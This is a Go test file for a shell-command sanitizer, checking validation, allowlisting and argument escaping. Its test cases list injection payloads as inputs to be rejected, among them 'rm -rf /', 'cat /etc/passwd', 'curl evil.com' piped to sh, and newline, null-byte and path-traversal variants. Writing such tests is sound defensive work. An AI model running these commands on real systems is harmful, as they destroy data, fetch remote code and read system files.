package shell

import (
	"strings"
	"testing"
)

func TestStrictSanitizer_Validate(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		mode    SanitizationMode
		wantErr bool
		errMsg  string
	}{
		// Safe commands
		{
			name:    "simple safe command",
			command: "echo",
			args:    []string{"hello"},
			mode:    ModeStrict,
			wantErr: false,
		},
		{
			name:    "command with safe args",
			command: "docker",
			args:    []string{"ps", "-a"},
			mode:    ModeStrict,
			wantErr: false,
		},
		{
			name:    "disabled mode allows anything",
			command: "echo",
			args:    []string{"; rm -rf /"},
			mode:    ModeDisabled,
			wantErr: false,
		},

		// Command chaining attacks
		{
			name:    "semicolon injection",
			command: "echo",
			args:    []string{"test; rm -rf /"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command chaining (semicolon)",
		},
		{
			name:    "AND chaining",
			command: "echo",
			args:    []string{"test && cat /etc/passwd"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command chaining (AND)",
		},
		{
			name:    "OR chaining",
			command: "echo",
			args:    []string{"test || curl evil.com"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command chaining (OR)",
		},
		{
			name:    "semicolon in command itself",
			command: "echo test; rm -rf /",
			args:    []string{},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command chaining (semicolon)",
		},

		// Command substitution attacks
		{
			name:    "command substitution with $()",
			command: "echo",
			args:    []string{"$(whoami)"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "command substitution with backticks",
			command: "echo",
			args:    []string{"`whoami`"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command substitution (backtick)",
		},
		{
			name:    "variable expansion",
			command: "echo",
			args:    []string{"${HOME}"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "variable expansion",
		},

		// Pipe and redirect attacks
		{
			name:    "pipe injection",
			command: "grep",
			args:    []string{"test | sh"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "pipe operator",
		},
		{
			name:    "output redirection",
			command: "echo",
			args:    []string{"test > /etc/passwd"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "output redirection",
		},
		{
			name:    "append redirection",
			command: "echo",
			args:    []string{"test >> /var/log/auth.log"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "output redirection",
		},
		{
			name:    "input redirection",
			command: "cat",
			args:    []string{"< /etc/passwd"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "input redirection",
		},

		// Background execution
		{
			name:    "background execution",
			command: "sleep",
			args:    []string{"10 & curl evil.com"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "background execution",
		},

		// Path traversal
		{
			name:    "path traversal",
			command: "cat",
			args:    []string{"../../../../etc/passwd"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "relative path traversal in command",
			command: "../../../bin/evil",
			args:    []string{},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "path traversal",
		},

		// Newline injection
		{
			name:    "newline injection",
			command: "echo",
			args:    []string{"test\nrm -rf /"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "newline injection",
		},
		{
			name:    "carriage return injection",
			command: "echo",
			args:    []string{"test\rcurl evil.com"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "carriage return injection",
		},

		// Null byte injection
		{
			name:    "null byte injection",
			command: "echo",
			args:    []string{"test\x00; rm -rf /"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "null byte",
		},

		// Complex multi-vector attacks
		{
			name:    "combined injection",
			command: "echo",
			args:    []string{"test && $(curl evil.com) | sh"},
			mode:    ModeStrict,
			wantErr: true,
			errMsg:  "command chaining (AND)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			config := DefaultConfig()
			config.Mode = tt.mode
			sanitizer := NewSanitizer(config)

			err := sanitizer.Validate(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing '%s'", err, tt.errMsg)
			}
		})
	}
}

func TestAllowlistSanitizer_Validate(t *testing.T) {
	tests := []struct {
		name            string
		allowedCommands []string
		command         string
		args            []string
		wantErr         bool
		errMsg          string
	}{
		{
			name:            "allowed command",
			allowedCommands: []string{"echo", "docker", "kubectl"},
			command:         "echo",
			args:            []string{"hello"},
			wantErr:         false,
		},
		{
			name:            "allowed command with args",
			allowedCommands: []string{"docker"},
			command:         "docker",
			args:            []string{"ps", "-a"},
			wantErr:         false,
		},
		{
			name:            "disallowed command",
			allowedCommands: []string{"echo"},
			command:         "rm",
			args:            []string{"-rf", "/"},
			wantErr:         true,
			errMsg:          "not in allowlist",
		},
		{
			name:            "command not in allowlist",
			allowedCommands: []string{"npm", "yarn"},
			command:         "curl",
			args:            []string{"evil.com"},
			wantErr:         true,
			errMsg:          "not in allowlist",
		},
		{
			name:            "injection attempt in allowed command",
			allowedCommands: []string{"echo"},
			command:         "echo",
			args:            []string{"; rm -rf /"},
			wantErr:         true,
			errMsg:          "command chaining",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sanitizer := NewAllowlistSanitizer(tt.allowedCommands...)

			err := sanitizer.Validate(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("Validate() expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Validate() unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing '%s'", err, tt.errMsg)
			}
		})
	}
}

func TestStrictSanitizer_Sanitize(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		mode    SanitizationMode
		want    string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "simple command with safe args",
			command: "echo",
			args:    []string{"hello", "world"},
			mode:    ModeStrict,
			want:    "echo hello world",
			wantErr: false,
		},
		{
			name:    "command with args needing escaping",
			command: "echo",
			args:    []string{"hello world"},
			mode:    ModeStrict,
			want:    "echo 'hello world'",
			wantErr: false,
		},
		{
			name:    "command with single quote in arg",
			command: "echo",
			args:    []string{"it's working"},
			mode:    ModeStrict,
			want:    "echo 'it'\"'\"'s working'",
			wantErr: false,
		},
		{
			name:    "injection attempt fails sanitization",
			command: "echo",
			args:    []string{"; rm -rf /"},
			mode:    ModeStrict,
			want:    "",
			wantErr: true,
			errMsg:  "sanitization failed",
		},
		{
			name:    "disabled mode allows dangerous input",
			command: "echo",
			args:    []string{"; rm -rf /"},
			mode:    ModeDisabled,
			want:    "echo ; rm -rf /",
			wantErr: false,
		},
		{
			name:    "path arguments are preserved",
			command: "ls",
			args:    []string{"/usr/local/bin"},
			mode:    ModeStrict,
			want:    "ls /usr/local/bin",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			config := DefaultConfig()
			config.Mode = tt.mode
			sanitizer := NewSanitizer(config)

			got, err := sanitizer.Sanitize(tt.command, tt.args)

			if tt.wantErr && err == nil {
				t.Errorf("Sanitize() expected error containing '%s', got nil", tt.errMsg)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("Sanitize() unexpected error: %v", err)
			}
			if tt.wantErr && err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Sanitize() error = %v, want error containing '%s'", err, tt.errMsg)
			}
			if !tt.wantErr && got != tt.want {
				t.Errorf("Sanitize() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestEscapeShellArg(t *testing.T) {
	tests := []struct {
		name string
		arg  string
		want string
	}{
		{
			name: "simple arg no escaping needed",
			arg:  "hello",
			want: "hello",
		},
		{
			name: "alphanumeric with dash and underscore",
			arg:  "hello-world_123",
			want: "hello-world_123",
		},
		{
			name: "path with slashes",
			arg:  "/usr/local/bin",
			want: "/usr/local/bin",
		},
		{
			name: "arg with spaces",
			arg:  "hello world",
			want: "'hello world'",
		},
		{
			name: "arg with single quote",
			arg:  "it's",
			want: "'it'\"'\"'s'",
		},
		{
			name: "arg with special characters",
			arg:  "test;rm -rf /",
			want: "'test;rm -rf /'",
		},
		{
			name: "arg with backticks",
			arg:  "`whoami`",
			want: "'`whoami`'",
		},
		{
			name: "arg with command substitution",
			arg:  "$(whoami)",
			want: "'$(whoami)'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := escapeShellArg(tt.arg)
			if got != tt.want {
				t.Errorf("escapeShellArg() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestIsSimpleArg(t *testing.T) {
	tests := []struct {
		name string
		arg  string
		want bool
	}{
		{"alphanumeric", "hello123", true},
		{"with dash", "hello-world", true},
		{"with underscore", "hello_world", true},
		{"with dot", "file.txt", true},
		{"with slash", "/usr/bin", true},
		{"with colon", "key:value", true},
		{"with space", "hello world", false},
		{"with semicolon", "hello;world", false},
		{"with ampersand", "hello&world", false},
		{"with pipe", "hello|world", false},
		{"with dollar", "$HOME", false},
		{"with backtick", "`cmd`", false},
		{"with paren", "$(cmd)", false},
		{"empty string", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isSimpleArg(tt.arg)
			if got != tt.want {
				t.Errorf("isSimpleArg(%q) = %v, want %v", tt.arg, got, tt.want)
			}
		})
	}
}

func TestSanitizerMode(t *testing.T) {
	tests := []struct {
		name     string
		config   *SanitizerConfig
		wantMode SanitizationMode
	}{
		{
			name:     "default config is strict",
			config:   DefaultConfig(),
			wantMode: ModeStrict,
		},
		{
			name:     "allowlist config",
			config:   AllowlistConfig("echo", "docker"),
			wantMode: ModeAllowlist,
		},
		{
			name: "custom strict config",
			config: &SanitizerConfig{
				Mode: ModeStrict,
			},
			wantMode: ModeStrict,
		},
		{
			name: "warn mode",
			config: &SanitizerConfig{
				Mode: ModeWarn,
			},
			wantMode: ModeWarn,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sanitizer := NewSanitizer(tt.config)
			if got := sanitizer.Mode(); got != tt.wantMode {
				t.Errorf("Mode() = %v, want %v", got, tt.wantMode)
			}
		})
	}
}

// Benchmark tests
func BenchmarkValidate_SafeCommand(b *testing.B) {
	sanitizer := NewSanitizer(DefaultConfig())
	command := "echo"
	args := []string{"hello", "world"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = sanitizer.Validate(command, args)
	}
}

func BenchmarkValidate_DangerousCommand(b *testing.B) {
	sanitizer := NewSanitizer(DefaultConfig())
	command := "echo"
	args := []string{"; rm -rf /"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = sanitizer.Validate(command, args)
	}
}

func BenchmarkSanitize_SimpleArgs(b *testing.B) {
	sanitizer := NewSanitizer(DefaultConfig())
	command := "docker"
	args := []string{"ps", "-a"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = sanitizer.Sanitize(command, args)
	}
}

func BenchmarkEscapeShellArg_Simple(b *testing.B) {
	arg := "simple-arg_123"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = escapeShellArg(arg)
	}
}

func BenchmarkEscapeShellArg_Complex(b *testing.B) {
	arg := "complex arg with 'quotes' and spaces"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = escapeShellArg(arg)
	}
}
